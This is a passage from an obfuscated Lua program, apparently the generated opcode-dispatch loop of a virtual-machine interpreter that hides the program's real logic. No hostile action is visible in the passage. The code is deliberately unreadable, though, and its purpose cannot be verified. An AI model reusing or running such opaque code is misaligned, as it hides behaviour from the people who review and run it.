10==ba then w[y[684]]=w[y[897]][y[404]];else n=n+1;end end else if ba<=13 then if ba<13 then y=f[n];else bb=y[684]end else if 15>ba then w[bb]=w[bb](r(w,bb+1,y[897]))else break end end end end ba=ba+1 end end;elseif z<=44 then if 42>=z then local ba;local bb,bc;local bd;w[y[684]]=w[y[897]][w[y[404]]];n=n+1;y=f[n];w[y[684]]=w[y[897]];n=n+1;y=f[n];w[y[684]]=y[897];n=n+1;y=f[n];w[y[684]]=y[897];n=n+1;y=f[n];w[y[684]]=y[897];n=n+1;y=f[n];bd=y[684]bb,bc=i(w[bd](r(w,bd+1,y[897])))p=bc+bd-1 ba=0;for bc=bd,p do ba=ba+1;w[bc]=bb[ba];end;elseif z>43 then w={};for ba=0,u,1 do if ba<o then w[ba]=s[ba+1];else break;end;end;n=n+1;y=f[n];w[y[684]]=y[897];n=n+1;y=f[n];w[y[684]]=h[y[897]];n=n+1;y=f[n];w[y[684]]=h[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=w[y[897]][w[y[404]]];n=n+1;y=f[n];if(w[y[684]]~=y[404])then n=n+1;else n=y[897];end;else local ba;w[y[684]]={};n=n+1;y=f[n];w[y[684]]=h[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]][y[897]]=w[y[404]];n=n+1;y=f[n];w[y[684]]=j[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=j[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];ba=y[684]w[ba]=w[ba]()end;elseif 45>=z then local ba,bb=0 while true do if ba<=8 then if ba<=3 then if ba<=1 then if ba<1 then bb=nil else w[y[684]]=w[y[897]][y[404]];end else if ba==2 then n=n+1;else y=f[n];end end else if ba<=5 then if 4<ba then n=n+1;else w[y[684]]=h[y[897]];end else if ba<=6 then y=f[n];else if ba<8 then w[y[684]]=w[y[897]][y[404]];else n=n+1;end end end end else if ba<=13 then if ba<=10 then if 10>ba then y=f[n];else w[y[684]]=y[897];end else if ba<=11 then n=n+1;else if 12==ba then y=f[n];else w[y[684]]=y[897];end end end else if ba<=15 then if 14<ba then y=f[n];else n=n+1;end else if ba<=16 then bb=y[684]else if ba==17 then w[bb]=w[bb](r(w,bb+1,y[897]))else break end end end end end ba=ba+1 end elseif 46<z then local ba;local bb;local bc;w[y[684]]=h[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=h[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=w[y[897]][w[y[404]]];n=n+1;y=f[n];w[y[684]]=h[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];bc=y[897];bb=y[404];ba=k(w,g,bc,bb);w[y[684]]=ba;else local ba;w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=false;n=n+1;y=f[n];ba=y[684]w[ba](w[ba+1])end;elseif 71>=z then if z<=59 then if 53>=z then if z<=50 then if 48>=z then local ba;w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=h[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]={};n=n+1;y=f[n];w[y[684]]=h[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=h[y[897]];n=n+1;y=f[n];w[y[684]]={};n=n+1;y=f[n];w[y[684]]=h[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];ba=y[684]w[ba]=w[ba]()elseif 49==z then if not w[y[684]]then n=n+1;else n=y[897];end;else h[y[897]]=w[y[684]];end;elseif z<=51 then w[y[684]]=true;elseif z~=53 then local ba=y[684];local bb=w[y[897]];w[ba+1]=bb;w[ba]=bb[y[404]];else if(w[y[684]]~=y[404])then n=n+1;else n=y[897];end;end;elseif z<=56 then if z<=54 then w[y[684]]=false;n=(n+1);elseif 55==z then local ba;local bb;local bc;w[y[684]]=h[y[897]];n=n+1;y=f[n];w[y[684]]=h[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=w[y[897]][w[y[404]]];n=n+1;y=f[n];bc=y[684]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[404]do ba=ba+1;w[bd]=bb[ba];end else w[y[684]]=w[y[897]]-y[404];end;elseif z<=57 then local ba=y[684]w[ba](r(w,ba+1,y[897]))elseif 58<z then local ba;w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=false;n=n+1;y=f[n];ba=y[684]w[ba](w[ba+1])else local ba;w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=y[897];n=n+1;y=f[n];w[y[684]]=h[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];ba=y[684]w[ba]=w[ba](r(w,ba+1,y[897]))end;elseif z<=65 then if 62>=z then if z<=60 then w[y[684]]=true;elseif 62~=z then local ba;local bb;local bc;w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=h[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=w[y[897]][w[y[404]]];n=n+1;y=f[n];w[y[684]]=h[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];bc=y[897];bb=y[404];ba=k(w,g,bc,bb);w[y[684]]=ba;else w[y[684]]=j[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=j[y[897]];n=n+1;y=f[n];w[y[684]]=j[y[897]];n=n+1;y=f[n];w[y[684]]=j[y[897]];n=n+1;y=f[n];w[y[684]]=j[y[897]];n=n+1;y=f[n];w[y[684]]=j[y[897]];n=n+1;y=f[n];w[y[684]]=j[y[897]];n=n+1;y=f[n];w[y[684]]=j[y[897]];n=n+1;y=f[n];w[y[684]]=j[y[897]];n=n+1;y=f[n];w[y[684]]={};n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];if not w[y[684]]then n=n+1;else n=y[897];end;end;elseif 63>=z then local ba;local bb;local bc;w[y[684]]=h[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=h[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=w[y[897]][w[y[404]]];n=n+1;y=f[n];w[y[684]]=h[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];bc=y[897];bb=y[404];ba=k(w,g,bc,bb);w[y[684]]=ba;elseif z==64 then local ba;w[y[684]]=j[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=h[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];ba=y[684]w[ba]=w[ba](w[ba+1])else local ba=y[897];local bb=y[404];local ba=k(w,g,ba,bb);w[y[684]]=ba;end;elseif z<=68 then if 66>=z then local ba;w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=y[897];n=n+1;y=f[n];w[y[684]]=h[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];ba=y[684];do return w[ba](r(w,ba+1,y[897]))end;n=n+1;y=f[n];ba=y[684];do return r(w,ba,p)end;n=n+1;y=f[n];n=y[897];elseif z~=68 then local ba;w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=h[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=y[897];n=n+1;y=f[n];w[y[684]]=y[897];n=n+1;y=f[n];ba=y[684]w[ba]=w[ba](r(w,ba+1,y[897]))else local ba;w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=w[y[897]]*y[404];n=n+1;y=f[n];w[y[684]]=w[y[897]]+w[y[404]];n=n+1;y=f[n];w[y[684]]=j[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=w[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]]+w[y[404]];n=n+1;y=f[n];ba=y[684]w[ba]=w[ba](r(w,ba+1,y[897]))end;elseif 69>=z then local ba=y[684]w[ba]=w[ba]()elseif 70<z then local ba;local bb;local bc;w[y[684]]=h[y[897]];n=n+1;y=f[n];w[y[684]]=h[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=w[y[897]][w[y[404]]];n=n+1;y=f[n];bc=y[684]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[404]do ba=ba+1;w[bd]=bb[ba];end else local ba;local bb;local bc;w[y[684]]=j[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];bc=y[684]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[404]do ba=ba+1;w[bd]=bb[ba];end end;elseif z<=83 then if 77>=z then if 74>=z then if z<=72 then local ba;local bb;local bc;w[y[684]]=h[y[897]];n=n+1;y=f[n];w[y[684]]=h[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=w[y[897]][w[y[404]]];n=n+1;y=f[n];bc=y[684]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[404]do ba=ba+1;w[bd]=bb[ba];end elseif 73<z then local ba;local bb;local bc;w[y[684]]=h[y[897]];n=n+1;y=f[n];w[y[684]]=h[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=w[y[897]][w[y[404]]];n=n+1;y=f[n];bc=y[684]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[404]do ba=ba+1;w[bd]=bb[ba];end else local ba=y[684]w[ba]=w[ba](r(w,ba+1,y[897]))end;elseif 75>=z then w[y[684]][w[y[897]]]=w[y[404]];elseif z~=77 then local ba=y[684];do return r(w,ba,p)end;else local ba;local bb;local bc;w[y[684]]=h[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=h[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=w[y[897]][w[y[404]]];n=n+1;y=f[n];w[y[684]]=h[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];bc=y[897];bb=y[404];ba=k(w,g,bc,bb);w[y[684]]=ba;end;elseif z<=80 then if z<=78 then local ba,bb=0 while true do if ba<=12 then if ba<=5 then if ba<=2 then if ba<=0 then bb=nil else if 1==ba then w={};else for bc=0,u,1 do if bc<o then w[bc]=s[bc+1];else break;end;end;end end else if ba<=3 then n=n+1;else if ba~=5 then y=f[n];else w[y[684]]=h[y[897]];end end end else if ba<=8 then if ba<=6 then n=n+1;else if ba~=8 then y=f[n];else w[y[684]]=j[y[897]];end end else if ba<=10 then if 10>ba then n=n+1;else y=f[n];end else if 12>ba then w[y[684]]=w[y[897]][y[404]];else n=n+1;end end end end else if ba<=18 then if ba<=15 then if ba<=13 then y=f[n];else if ba<15 then w[y[684]]=y[897];else n=n+1;end end else if ba<=16 then y=f[n];else if ba~=18 then w[y[684]]=y[897];else n=n+1;end end end else if ba<=21 then if ba<=19 then y=f[n];else if 20<ba then n=n+1;else w[y[684]]=y[897];end end else if ba<=23 then if ba<23 then y=f[n];else bb=y[684]end else if ba~=25 then w[bb]=w[bb](r(w,bb+1,y[897]))else break end end end end end ba=ba+1 end elseif z~=80 then local ba=y[684]w[ba](w[ba+1])else local ba;w[y[684]]=j[y[897]];n=n+1;y=f[n];w[y[684]]=y[897];n=n+1;y=f[n];w[y[684]]=w[y[897]][w[y[404]]];n=n+1;y=f[n];w[y[684]]=w[y[897]];n=n+1;y=f[n];ba=y[684]w[ba]=w[ba](w[ba+1])end;elseif 81>=z then a(c,e);n=n+1;y=f[n];w={};for ba=0,u,1 do if ba<o then w[ba]=s[ba+1];else break;end;end;n=n+1;y=f[n];w[y[684]]=y[897];n=n+1;y=f[n];w[y[684]]=j[y[897]];n=n+1;y=f[n];w[y[684]]=j[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];elseif 82==z then local ba;local bb;local bc;w[y[684]]=h[y[897]];n=n+1;y=f[n];w[y[684]]=h[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=w[y[897]][w[y[404]]];n=n+1;y=f[n];bc=y[684]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[404]do ba=ba+1;w[bd]=bb[ba];end else local ba;w[y[684]]=h[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=y[897];n=n+1;y=f[n];w[y[684]]=y[897];n=n+1;y=f[n];ba=y[684]w[ba]=w[ba](r(w,ba+1,y[897]))end;elseif 89>=z then if z<=86 then if 84>=z then w[y[684]]={r({},1,y[897])};elseif 86>z then local ba;w[y[684]]=w[y[897]][w[y[404]]];n=n+1;y=f[n];w[y[684]]=w[y[897]];n=n+1;y=f[n];w[y[684]]=y[897];n=n+1;y=f[n];w[y[684]]=y[897];n=n+1;y=f[n];w[y[684]]=y[897];n=n+1;y=f[n];ba=y[684]w[ba]=w[ba](r(w,ba+1,y[897]))else w[y[684]]=h[y[897]];n=n+1;y=f[n];w[y[684]]=h[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=w[y[897]][w[y[404]]];n=n+1;y=f[n];if(w[y[684]]~=y[404])then n=n+1;else n=y[897];end;end;elseif z<=87 then w[y[684]][y[897]]=y[404];elseif 89>z then local ba;w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=y[897];n=n+1;y=f[n];w[y[684]]=y[897];n=n+1;y=f[n];w[y[684]]=y[897];n=n+1;y=f[n];ba=y[684]w[ba]=w[ba](r(w,ba+1,y[897]))else do return end;end;elseif z<=92 then if z<=90 then for ba=y[684],y[897],1 do w[ba]=nil;end;elseif 92~=z then local ba=y[684]local bb={w[ba](r(w,ba+1,y[897]))};local bc=0;for bd=ba,y[404]do bc=bc+1;w[bd]=bb[bc];end;else local ba;local bb;local bc;w[y[684]]=h[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=h[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=w[y[897]][w[y[404]]];n=n+1;y=f[n];w[y[684]]=h[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];bc=y[897];bb=y[404];ba=k(w,g,bc,bb);w[y[684]]=ba;end;elseif z<=93 then local ba,bb=0 while true do if ba<=7 then if ba<=3 then if ba<=1 then if ba==0 then bb=nil else w[y[684]]=h[y[897]];end else if 2<ba then y=f[n];else n=n+1;end end else if ba<=5 then if ba>4 then n=n+1;else w[y[684]]=w[y[897]][y[404]];end else if ba>6 then w[y[684]]=y[897];else y=f[n];end end end else if ba<=11 then if ba<=9 then if ba<9 then n=n+1;else y=f[n];end else if 11~=ba then w[y[684]]=y[897];else n=n+1;end end else if ba<=13 then if 12==ba then y=f[n];else bb=y[684]end else if 15~=ba then w[bb]=w[bb](r(w,bb+1,y[897]))else break end end end end ba=ba+1 end elseif 94<z then local ba=y[684];do return w[ba](r(w,ba+1,y[897]))end;else local ba;local bb;local bc;w[y[684]]=h[y[897]];n=n+1;y=f[n];w[y[684]]=h[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=w[y[897]][w[y[404]]];n=n+1;y=f[n];bc=y[684]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[404]do ba=ba+1;w[bd]=bb[ba];end end;elseif z<=143 then if 119>=z then if 107>=z then if 101>=z then if 98>=z then if 96>=z then local ba;w={};for bb=0,u,1 do if bb<o then w[bb]=s[bb+1];else break;end;end;n=n+1;y=f[n];w[y[684]]=h[y[897]];n=n+1;y=f[n];w[y[684]]=j[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=y[897];n=n+1;y=f[n];w[y[684]]=y[897];n=n+1;y=f[n];w[y[684]]=y[897];n=n+1;y=f[n];ba=y[684]w[ba]=w[ba](r(w,ba+1,y[897]))elseif z>97 then local ba=y[684]local bb,bc=i(w[ba](r(w,ba+1,y[897])))p=bc+ba-1 local bc=0;for bd=ba,p do bc=bc+1;w[bd]=bb[bc];end;else local ba;w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=w[y[897]];n=n+1;y=f[n];w[y[684]]=h[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];ba=y[684]w[ba]=w[ba](r(w,ba+1,y[897]))end;elseif z<=99 then local ba;w[y[684]]=j[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=h[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];ba=y[684]w[ba]=w[ba](w[ba+1])elseif z<101 then if(w[y[684]]~=w[y[404]])then n=n+1;else n=y[897];end;else local ba=y[684]w[ba]=w[ba]()end;elseif z<=104 then if 102>=z then local ba=0 while true do if ba<=6 then if ba<=2 then if ba<=0 then w[y[684]]=w[y[897]][y[404]];else if 1<ba then y=f[n];else n=n+1;end end else if ba<=4 then if 4>ba then w[y[684]]=w[y[897]][y[404]];else n=n+1;end else if 5<ba then w[y[684]]=w[y[897]][y[404]];else y=f[n];end end end else if ba<=9 then if ba<=7 then n=n+1;else if ba~=9 then y=f[n];else w[y[684]]=w[y[897]][y[404]];end end else if ba<=11 then if 11~=ba then n=n+1;else y=f[n];end else if ba~=13 then w[y[684]]=w[y[897]][w[y[404]]];else break end end end end ba=ba+1 end elseif z~=104 then w[y[684]][y[897]]=y[404];n=n+1;y=f[n];w[y[684]]={};n=n+1;y=f[n];w[y[684]][y[897]]=w[y[404]];n=n+1;y=f[n];w[y[684]]=h[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]][y[897]]=w[y[404]];n=n+1;y=f[n];w[y[684]][y[897]]=w[y[404]];else local ba;w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=h[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=h[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=h[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];ba=y[684]w[ba]=w[ba](r(w,ba+1,y[897]))end;elseif 105>=z then w[y[684]]=w[y[897]][y[404]];elseif z<107 then w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];if w[y[684]]then n=n+1;else n=y[897];end;else w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];if w[y[684]]then n=n+1;else n=y[897];end;end;elseif z<=113 then if 110>=z then if z<=108 then local ba,bb=0 while true do if ba<=12 then if ba<=5 then if ba<=2 then if ba<=0 then bb=nil else if ba==1 then w={};else for bc=0,u,1 do if bc<o then w[bc]=s[bc+1];else break;end;end;end end else if ba<=3 then n=n+1;else if 5~=ba then y=f[n];else w[y[684]]=h[y[897]];end end end else if ba<=8 then if ba<=6 then n=n+1;else if ba==7 then y=f[n];else w[y[684]]=j[y[897]];end end else if ba<=10 then if ba<10 then n=n+1;else y=f[n];end else if ba>11 then n=n+1;else w[y[684]]=w[y[897]][y[404]];end end end end else if ba<=18 then if ba<=15 then if ba<=13 then y=f[n];else if 15>ba then w[y[684]]=y[897];else n=n+1;end end else if ba<=16 then y=f[n];else if ba==17 then w[y[684]]=y[897];else n=n+1;end end end else if ba<=21 then if ba<=19 then y=f[n];else if 20==ba then w[y[684]]=y[897];else n=n+1;end end else if ba<=23 then if 22==ba then y=f[n];else bb=y[684]end else if 24==ba then w[bb]=w[bb](r(w,bb+1,y[897]))else break end end end end end ba=ba+1 end elseif 110>z then local ba;w[y[684]]=j[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=y[897];n=n+1;y=f[n];w[y[684]]=y[897];n=n+1;y=f[n];w[y[684]]=y[897];n=n+1;y=f[n];w[y[684]]=y[897];n=n+1;y=f[n];ba=y[684]w[ba]=w[ba](r(w,ba+1,y[897]))else local ba;w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=h[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]={};n=n+1;y=f[n];w[y[684]]=h[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=h[y[897]];n=n+1;y=f[n];w[y[684]]={};n=n+1;y=f[n];w[y[684]]=h[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];ba=y[684]w[ba]=w[ba]()end;elseif 111>=z then local ba;local bb;local bc;w[y[684]]=h[y[897]];n=n+1;y=f[n];w[y[684]]=h[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=w[y[897]][w[y[404]]];n=n+1;y=f[n];bc=y[684]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[404]do ba=ba+1;w[bd]=bb[ba];end elseif 112<z then w[y[684]]=#w[y[897]];else w[y[684]][w[y[897]]]=w[y[404]];end;elseif z<=116 then if 114>=z then local ba=0 while true do if ba<=6 then if ba<=2 then if ba<=0 then w[y[684]]=w[y[897]][y[404]];else if 1==ba then n=n+1;else y=f[n];end end else if ba<=4 then if 4>ba then w[y[684]]=w[y[897]][y[404]];else n=n+1;end else if 5<ba then w[y[684]]=w[y[897]][y[404]];else y=f[n];end end end else if ba<=9 then if ba<=7 then n=n+1;else if 8==ba then y=f[n];else w[y[684]]=w[y[897]][y[404]];end end else if ba<=11 then if 10<ba then y=f[n];else n=n+1;end else if 13>ba then if w[y[684]]then n=n+1;else n=y[897];end;else break end end end end ba=ba+1 end elseif z>115 then local ba;w[y[684]]=w[y[897]];n=n+1;y=f[n];w[y[684]]=y[897];n=n+1;y=f[n];w[y[684]]=y[897];n=n+1;y=f[n];w[y[684]]=y[897];n=n+1;y=f[n];ba=y[684]w[ba]=w[ba](r(w,ba+1,y[897]))else local ba;w[y[684]][y[897]]=w[y[404]];n=n+1;y=f[n];w[y[684]]={};n=n+1;y=f[n];w[y[684]][y[897]]=y[404];n=n+1;y=f[n];w[y[684]][y[897]]=w[y[404]];n=n+1;y=f[n];ba=y[684]w[ba]=w[ba](r(w,ba+1,y[897]))end;elseif z<=117 then w={};for ba=0,u,1 do if ba<o then w[ba]=s[ba+1];else break;end;end;elseif z<119 then w={};for ba=0,u,1 do if ba<o then w[ba]=s[ba+1];else break;end;end;n=n+1;y=f[n];w[y[684]]=h[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=h[y[897]];n=n+1;y=f[n];w[y[684]]={};n=n+1;y=f[n];w[y[684]]={};n=n+1;y=f[n];w[y[684]][y[897]]=w[y[404]];n=n+1;y=f[n];w[y[684]]=j[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];if w[y[684]]then n=n+1;else n=y[897];end;else local ba;w[y[684]]=w[y[897]][w[y[404]]];n=n+1;y=f[n];w[y[684]]=w[y[897]];n=n+1;y=f[n];w[y[684]]=y[897];n=n+1;y=f[n];w[y[684]]=y[897];n=n+1;y=f[n];w[y[684]]=y[897];n=n+1;y=f[n];ba=y[684]w[ba]=w[ba](r(w,ba+1,y[897]))end;elseif z<=131 then if 125>=z then if 122>=z then if z<=120 then local ba;local bb;w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=j[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];bb=y[684];ba=w[bb];for bc=bb+1,y[897]do t(ba,w[bc])end;elseif z>121 then if not w[y[684]]then n=n+1;else n=y[897];end;else local ba;local bb;local bc;w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=w[y[897]];n=n+1;y=f[n];w[y[684]]=h[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=h[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];bc=y[897];bb=y[404];ba=k(w,g,bc,bb);w[y[684]]=ba;end;elseif 123>=z then local ba=0 while true do if ba<=6 then if ba<=2 then if ba<=0 then w[y[684]]=h[y[897]];else if ba<2 then n=n+1;else y=f[n];end end else if ba<=4 then if 4~=ba then w[y[684]]=h[y[897]];else n=n+1;end else if 5==ba then y=f[n];else w[y[684]]=w[y[897]][y[404]];end end end else if ba<=9 then if ba<=7 then n=n+1;else if 9>ba then y=f[n];else w[y[684]]=w[y[897]][w[y[404]]];end end else if ba<=11 then if 11>ba then n=n+1;else y=f[n];end else if 13>ba then if(w[y[684]]~=y[404])then n=n+1;else n=y[897];end;else break end end end end ba=ba+1 end elseif z>124 then local ba=y[684]w[ba]=w[ba](w[ba+1])else w={};for ba=0,u,1 do if ba<o then w[ba]=s[ba+1];else break;end;end;n=n+1;y=f[n];w[y[684]]=h[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=h[y[897]];n=n+1;y=f[n];w[y[684]]={};n=n+1;y=f[n];w[y[684]]={};n=n+1;y=f[n];w[y[684]][y[897]]=w[y[404]];n=n+1;y=f[n];w[y[684]]=j[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];if w[y[684]]then n=n+1;else n=y[897];end;end;elseif z<=128 then if 126>=z then local ba,bb=0 while true do if ba<=10 then if ba<=4 then if ba<=1 then if 1>ba then bb=nil else w[y[684]]=j[y[897]];end else if ba<=2 then n=n+1;else if ba>3 then w[y[684]]=w[y[897]][y[404]];else y=f[n];end end end else if ba<=7 then if ba<=5 then n=n+1;else if 7~=ba then y=f[n];else w[y[684]]=y[897];end end else if ba<=8 then n=n+1;else if 9<ba then w[y[684]]=y[897];else y=f[n];end end end end else if ba<=15 then if ba<=12 then if ba==11 then n=n+1;else y=f[n];end else if ba<=13 then w[y[684]]=y[897];else if 15~=ba then n=n+1;else y=f[n];end end end else if ba<=18 then if ba<=16 then w[y[684]]=y[897];else if 17==ba then n=n+1;else y=f[n];end end else if ba<=19 then bb=y[684]else if 20<ba then break else w[bb]=w[bb](r(w,bb+1,y[897]))end end end end end ba=ba+1 end elseif z~=128 then local ba=y[684]w[ba](r(w,ba+1,y[897]))else local ba;w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];ba=y[684]w[ba]=w[ba](w[ba+1])end;elseif z<=129 then local 